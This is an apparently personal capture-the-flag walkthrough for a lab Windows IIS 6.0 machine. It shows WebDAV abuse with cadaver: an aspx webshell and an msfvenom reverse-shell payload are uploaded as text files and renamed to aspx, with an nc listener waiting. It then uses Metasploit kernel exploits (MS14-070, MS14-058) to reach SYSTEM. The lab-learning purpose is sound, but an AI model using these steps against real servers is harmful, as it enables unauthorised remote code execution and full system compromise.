## Port 80

### Gobuster

#### Directory busting

```

- The private folder is useless for now
- We can also change our /etc/hosts file and add this list `10.10.10.15     granny.htb`

## Check for known vulnerabilities

### Google fu

- While gobuster is running, let's have a look in Google. IIS 6.0 seems to have a possible code execution vulnerability

### Nmap with vuln script

- Nmap has great scripts including some that will check for know vulnerabilities

- The nmap enum is actually better than the wordlist I used with Gobuster. We get a few interesing directories.

### Frontpage extension

- According to our nmap we should be able to login anonymously. It refers us to this [article](https://insecure.org/sploits/Microsoft.frontpage.insecurities.html)
- Googling around we also find [this](https://github.com/deepak0401/Front-Page-Exploit). Let's use burp and temper with the request.
- Using it we can get more info. Our front page user name is "unknown"  
![username](../.res/2022-10-10-07-46-31.png)  
- The server version is `4.0.2.2611`  
![version](../.res/2022-10-10-07-48-12.png)  

### Davtest

- With further research we find this article on [null-byte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
- Davtest is able to create a directory and was able to execute html and txt.  
![davtest](../.res/2022-10-10-10-43-11.png)  
- While browsing in the directories disclosed through nmap I saw an asmx file. Let's try to put an an asmx file test there.
- Using cadaver `cadaver http://10.10.10.15/DavTestDir_kbmSbjBY` we can connect and upload files. I get forbidden with aspx and asmx files but txt and html works.
- There is a kali webshell in aspx here `/usr/share/webshells/aspx/cmdasp.aspx`
- Let's try to upload it as txt and then move it (we can move it with davtest move command)
- `cp cmdasp.aspx cmdasp.txt`
- `put cmdasp.txt` It works and we have it on the server  
![cmdasp](../.res/2022-10-10-12-54-24.png)
- `move cmdasp.txt cmdasp.aspx` we move it  
![aspx](../.res/2022-10-10-13-01-10.png)  
- Now that we know we can do this let's make a payload with msfvenom and try to get a reverse shell `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f aspx -o reverse.aspx`.
- We copy our payload to make a txt version `cp reverse.aspx reverse.txt`
- We set a listener `rlwrap nc -lnvp 4444`
- We put the txt file in the server and move it to make it executable by the server  

```bash
dav:/DavTestDir_kbmSbjBY/> put reverse.txt 
Uploading reverse.txt to `/DavTestDir_kbmSbjBY/reverse.txt':
Progress: [=============================>] 100.0% of 2747 bytes succeeded.
dav:/DavTestDir_kbmSbjBY/> move reverse.txt reverse.aspx
Moving `/DavTestDir_kbmSbjBY/reverse.txt' to `/DavTestDir_kbmSbjBY/reverse.aspx':  succeeded.
```

- We browse to http://10.10.10.15/DavTestDir_kbmSbjBY/reverse.aspx and get a shell  
![shell](../.res/2022-10-10-13-13-53.png)
- Our user is "network service"

## Privilege escalation

- Let's check for possible exploit with `systeminfo` we put the result of the command in a file.
- Systeminfo

- We can run windows exploit suggester on it `python3 /opt/wesng/wes.py --color sysinfo.txt | grep -B 3 -A 5 "Privilege"`
- I want to use metasploit for the privesc so I am going to get a shell using `exploit/windows/iis/iis_webdav_scstoragepathfromurl`
- This way I will also be able to check local exploit suggester
- From our session we can `run multi/recon/local_exploit_suggester`
- I do not get any result this way but from the previous check with wes we can try a few things like CVE-2014-4076.
- We should also migrate the shell because the getuid gives odd results. we just have to ps while in our sessions and find a pid that runs `NT AUTHORITY\NETWORK SERVICE`
- With a search on metasploit we find this `exploit/windows/local/ms14_070_tcpip_ioctl`
- We can use it
- we set the session with our session id `set session 21` then run and this will elevate our session  
![authority](../.res/2022-10-14-13-11-24.png)
- The session dies really quickly so we need to find another exploit. We can try `CVE-2014-4113` (or MS14_058)
- We can use `exploit/windows/local/ms14_058_track_popup_menu`
- Now we have to set session, set LHOST and choose a free port for LPORT.
- Then if we run we get another system shell but this time it does not die on us and we can grab the flags.
